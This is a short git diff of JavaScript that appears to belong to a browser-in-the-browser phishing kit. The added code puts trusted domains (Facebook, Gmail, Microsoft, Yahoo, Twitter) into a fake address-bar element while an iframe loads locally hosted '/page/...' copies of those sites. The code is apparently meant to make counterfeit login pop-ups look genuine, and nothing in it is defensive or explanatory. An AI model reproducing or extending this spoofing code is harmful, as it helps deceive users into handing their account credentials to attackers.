@@ -102,26 +102,39 @@ function setIframeSource(url) {
     content.src = url;
 }
 
+/// set url 
+function SeturlSource(url) {
+
+  let domain = document.getElementById("domain-name");
+  domain.innerHTML = url;
+
+}
+
 //// Pop-up appear on click with delay ////
 $("#clickme").click(function(){
   setIframeSource("/page")
+  SeturlSource("https://twitter.com/")
 });
 
 //// Pop-up appear on click with delay ////
 $("#clickme1").click(function(){
-  setIframeSource("/page/facebook")
+  setIframeSource("/page/facebook");
+  SeturlSource("https://facebook.com/");
 });
 
 //// Pop-up appear on click with delay ////
 $("#clickme2").click(function(){
-  setIframeSource("/page/gmail")
+  setIframeSource("/page/gmail");
+  SeturlSource("https://gmail.com/");
 });
 
 //// Pop-up appear on click with delay ////
 $("#clickme3").click(function(){
   setIframeSource("/page/microsoft")
+  SeturlSource("https://microsoft.com/")
 });
 
 $("#clickme4").click(function(){
   setIframeSource("/page/yahoo")
+  SeturlSource("https://yahoo.com/")
 });
